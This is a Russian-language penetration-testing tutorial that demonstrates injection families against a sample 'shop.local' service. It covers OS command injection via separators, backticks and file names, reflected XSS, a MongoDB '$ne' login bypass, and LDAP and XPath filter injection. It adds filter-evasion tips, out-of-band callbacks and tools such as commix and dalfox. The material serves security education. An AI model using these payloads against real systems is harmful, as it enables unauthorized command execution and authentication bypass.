## Задача

**Инъекция** — это когда данные, которые ты прислал, интерпретатор принимает за код. В SQL это запрос, в браузере — разметка, в оболочке — команда. Идея одна, но «движки» разные: XSS, инъекция команд ОС, NoSQL/LDAP/XPath.

Разберём три движка на одном приложении и покажем, как один и тот же ввод ломает разные интерпретаторы.

## Наш пример: сервис «проверка сайта»

Есть сервис, который по URL говорит, доступен ли сайт. Вводим адрес — он пингует:

```bash
$ curl -s 'https://shop.local/tools/ping?host=shop.local'
PING shop.local (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.03 ms
```

Приложение явно передаёт `host` в системную команду `ping`. Это первый движок — **командная оболочка**.

## Шаг 1: инъекция команд ОС

Раз команда собирается конкатенацией, добавим свой разделитель:

```bash
$ curl -s 'https://shop.local/tools/ping?host=shop.local;id'
PING shop.local (127.0.0.1): ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Символ `;` завершил `ping` и запустил `id`. Это **OS command injection**. Другие разделители: `|`, `&&`, `$(...)`, `` ` ``, `%0a` (новая строка). Мы получили выполнение команд на сервере.

> **Command injection** — пользовательский ввод попадает в системную команду и трактуется как её часть. Опаснее всего тем, что сразу даёт RCE.

## Шаг 2: XSS — тот же ввод, другой движок

У сервиса есть страница, которая показывает результат с нашим `host`:

```bash
$ curl -s 'https://shop.local/tools/ping?host=<b>hi</b>' | grep -o '<b>hi</b>'
<b>hi</b>
```

Теги не экранированы — значит, ввод попадает в HTML как разметка. Подставим скрипт:

```bash
$ curl -s 'https://shop.local/tools/ping?host=<script>alert(document.domain)</script>' | grep -c '<script>'
1
```

Это **reflected XSS** — браузер исполнит наш JavaScript в контексте жертвы. Здесь интерпретатор — не оболочка, а **браузер**. Один и тот же параметр `host` уязвим в двух разных смыслах.

## Шаг 3: NoSQL-инъекция

Часть API ходит не в SQL, а в MongoDB. Проверим логин, который принимает JSON:

```bash
$ curl -s https://shop.local/api/login -H 'Content-Type: application/json' \
  -d '{"user":"admin","pass":{"$ne":"x"}}'
{"status":"ok","user":"admin"}
```

Мы передали в `pass` не строку, а **оператор** `$ne` («не равно»). Сервер сравнил пароль с `{"$ne":"x"}` — условие истинно для любого пароля. Это **NoSQL-инъекция** через операторы. Интерпретатор здесь — язык запросов MongoDB.

## Шаг 4: LDAP и XPath — те же операторы

В корпоративных системах ввод уходит в LDAP-фильтр (`(&(uid=...)(pass=...))`) или XPath. Подстановка скобок и логических операторов ломает фильтр:

```bash
$ curl -s 'https://shop.local/ldap/login?u=admin)(|(uid=*))&p=x'
# фильтр становится (&(uid=admin)(|(uid=*))(pass=x)) -> всегда истинно
```

В XPath — `' or '1'='1`. Принцип единый: **оператор, попавший в язык запроса, меняет логику.**

## Шаг 5: как искать семейства

- **Command:** добавь `;id`, `|id`, `$(id)`, `%0a id` в поля, которые похожи на имена хостов/файлов.
- **XSS:** подставь `<b>test</b>`; если вернулось как разметка — пробуй `<script>`.
- **NoSQL:** замени строку на объект `{"$ne":""}` или `{"$gt":""}`.
- **LDAP/XPath:** добавь `)(|(uid=*))` или `' or '1'='1`.
- **Out-of-band:** если ответа нет, используй DNS/HTTP-callback (Interactsh).

## Если не сработало

- **`;` вырезан** — пробуй `%0a`, `%0d`, `$IFS`, обратные кавычки.
- **HTML экранируется** — ищи другой контекст (атрибут, JS-строка) или DOM-XSS.
- **NoSQL-объект отклонён** — проверь, не валидируется ли тип; попробуй массив `[$ne]`.
- **LDAP без вывода** — используй blind-технику: по времени или по разнице ответов.

## Что мы теперь знаем

- Инъекция — это данные, принятые за код; меняется только интерпретатор.
- Command injection сразу даёт RCE; XSS бьёт по браузеру жертвы; NoSQL/LDAP/XPath меняют логику запроса.
- Один параметр может быть уязвим сразу в нескольких семействах.
- Разделители и операторы — универсальный инструмент: `;`, `$ne`, `)(|`.

## Частые вопросы

**Почему это «одно и то же», если движки разные?** Потому что суть одна: **данные становятся кодом** для интерпретатора. Меняется только интерпретатор — оболочка, браузер, база.

**Какой класс опаснее всего?** Инъекция команд ОС: она сразу даёт RCE. XSS бьёт по браузеру жертвы, NoSQL/LDAP/XPath меняют логику запроса.

**Всегда ли нужен вывод?** Нет. Если ответа не видно, используй **out-of-band**: заставь цель обратиться к твоему домену (Interactsh), и подтвердишь blind-инъекцию.

**Как отличить инъекцию от обычной ошибки?** Меняй ввод по одному символу и следи за **изменением** поведения: новый код, задержка, утечка. Стабильная разница = инъекция.

**WAF мешает — что делать?** Меняй форму payload: кодировки, комментарии, разделители. См. ветвь `web-waf-bypass`.

**Где ещё искать инъекции?** Везде, где ввод уходит в интерпретатор: SQL, XML (XXE), шаблоны (SSTI), логи (Log4Shell), выражения (EL/OGNL).

## Ещё один сценарий: инъекция в имя файла

Часто ввод уходит в путь файла, который потом передаётся команде. Загрузка отчёта:

```bash
$ curl -s -F 'file=@x.pdf;filename=report$(id).pdf' https://shop.local/convert
uid=33(www-data) gid=33(www-data)
```

Имя файла попало в `convert report$(id).pdf out.png` — подстановка выполнилась. Это **command injection через имя файла**: фильтр проверял тип, но не имя.

Ещё один контекст — шаблон имени:

```bash
$ curl -s 'https://shop.local/report?name=2024`whoami`.pdf'
2024www-data.pdf
```

Обратные кавычки исполнились. Правило: проверяй **все** поля, которые попадают в команду, включая метаданные файла.

## На что смотреть дальше

- **Разделители.** `;`, `|`, `&&`, `$(...)`, обратные кавычки, `%0a`.
- **Слепые поля.** Имя файла, `User-Agent`, заголовки — тоже уходят в команды/логи.
- **Контекст.** HTML, атрибут, JS-строка, SQL, оболочка — payload зависит от контекста.
- **NoSQL/LDAP/XPath.** Операторы (`$ne`, `)(|`, `' or '1'='1`) вместо строк.
- **OOB.** Нет вывода — используй DNS/HTTP-callback (Interactsh).
- **Автоматизация.** `commix` (command), `dalfox` (XSS), `sqlmap` (SQL).
